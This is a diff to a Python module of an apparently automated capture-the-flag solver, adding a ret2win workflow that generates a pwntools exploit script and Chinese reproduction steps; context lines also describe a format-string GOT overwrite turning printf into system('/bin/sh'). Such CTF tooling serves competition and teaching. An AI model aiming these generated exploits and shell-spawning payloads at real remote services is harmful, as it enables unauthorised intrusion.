@@ -1,5 +1,6 @@
 from __future__ import annotations
 
+import re
 from typing import Any
 
 from forgeflag.domain import Challenge, Finding, Observation
@@ -585,6 +586,14 @@ def _pwn_exploit_reproduction_steps(plan: dict[str, Any], attachments: list[str]
             f"用 `fmtstr_payload({offset}, {{printf@got: system}}, write_size='short')` 分两次短写覆盖 printf@got。",
             "上传内容为 `/bin/sh` 的文件并执行 `get cmd`；此时原本的 printf(content) 已变成 system('/bin/sh')，脚本进入交互 shell。",
         ]
+    if workflow == "ret2win":
+        symbol = _ret2win_symbol_from_plan(plan)
+        return [
+            f"本地模式：把附件 {binary} 放在 exploit.py 同目录，先执行 `python3 exploit.py --binary ./{binary} --find-offset` 触发 cyclic crash；确认 offset 后执行 `python3 exploit.py --binary ./{binary} --offset <offset>`。",
+            "远程模式：把 HOST/PORT 改成题目给出的地址端口，或执行 `python3 exploit.py --remote --host <host> --port <port> --offset <offset>`。",
+            f"脚本会读取 ELF 符号 `{symbol}`，构造 padding + {symbol} 地址的 ret2win payload。",
+            "payload 发送后进入 `io.interactive()`，用于拿 shell 或读取服务回显 flag。",
+        ]
     return [
         f"本地模式：把附件 {binary} 放在 exploit.py 同目录，执行 `python3 exploit.py --binary ./{binary}`。",
         "远程模式：把 HOST/PORT 改成题目给出的地址端口，或执行 `python3 exploit.py --remote --host <host> --port <port>`。",
@@ -609,6 +618,8 @@ def _pwn_exploit_script(plan: dict[str, Any], attachments: list[str]) -> str:
     workflow = plan.get("workflow")
     if workflow == "ftp_heap_format_string":
         return _ftp_heap_format_string_exploit_script(plan, attachments)
+    if workflow == "ret2win":
+        return _ret2win_exploit_script(plan, attachments)
     binary = _basename(attachments[0]) if attachments else "challenge_binary"
     return f"""#!/usr/bin/env python3
 from pwn import *
@@ -634,6 +645,78 @@ def main():
     args = parse_args()
     io = start(args)
     # Fill in the payload from the PwnSolver evidence, then keep the shell open.
+    io.interactive()
+
+
+if __name__ == "__main__":
+    main()
+"""
+
+
+def _ret2win_symbol_from_plan(plan: dict[str, Any]) -> str:
+    symbol = str(plan.get("symbol") or "").strip()
+    if symbol:
+        return symbol
+    template = str(plan.get("payload_template") or "")
+    match = re.search(r"elf\.symbols\[['\"]([^'\"]+)['\"]\]", template)
+    return match.group(1) if match else "win"
+
+
+def _ret2win_exploit_script(plan: dict[str, Any], attachments: list[str]) -> str:
+    binary = _basename(attachments[0]) if attachments else "challenge_binary"
+    symbol = _ret2win_symbol_from_plan(plan)
+    return f"""#!/usr/bin/env python3
+from pwn import *
+import argparse
+
+WIN_SYMBOL = "{symbol}"
+CYCLIC_LENGTH = 512
+
+
+def parse_args():
+    parser = argparse.ArgumentParser(description="ForgeFlag generated ret2win exploit")
+    parser.add_argument("--remote", action="store_true")
+    parser.add_argument("--host", default="127.0.0.1")
+    parser.add_argument("--port", type=int, default=31337)
+    parser.add_argument("--binary", default="./{binary}")
+    parser.add_argument("--offset", type=int, default=None, help="cyclic offset to saved return address")
+    parser.add_argument("--find-offset", action="store_true", help="send cyclic(512), then inspect the crash/corefile")
+    parser.add_argument("--bits", type=int, choices=(32, 64), default=0, help="override address width; default reads ELF class")
+    parser.add_argument("--log-level", default="info")
+    return parser.parse_args()
+
+
+def start(args):
+    if args.remote:
+        return remote(args.host, args.port)
+    return process(args.binary)
+
+
+def pack_addr(value, args, elf):
+    bits = args.bits or elf.elfclass
+    return p32(value) if bits == 32 else p64(value)
+
+
+def main():
+    args = parse_args()
+    context.binary = elf = ELF(args.binary, checksec=False)
+    context.log_level = args.log_level
+
+    io = start(args)
+    if args.find_offset:
+        io.sendline(cyclic(CYCLIC_LENGTH))
+        log.info("sent cyclic(%d); inspect the crash with gdb/pwndbg and rerun with --offset", CYCLIC_LENGTH)
+        io.interactive()
+        return
+
+    if args.offset is None:
+        log.failure("missing --offset; run with --find-offset first, then compute cyclic_find(crash_value)")
+        raise SystemExit(2)
+
+    win_addr = elf.symbols["{symbol}"]
+    log.success("using %s at %#x", WIN_SYMBOL, win_addr)
+    payload = flat({{args.offset: pack_addr(win_addr, args, elf)}})
+    io.sendline(payload)
     io.interactive()
 
 
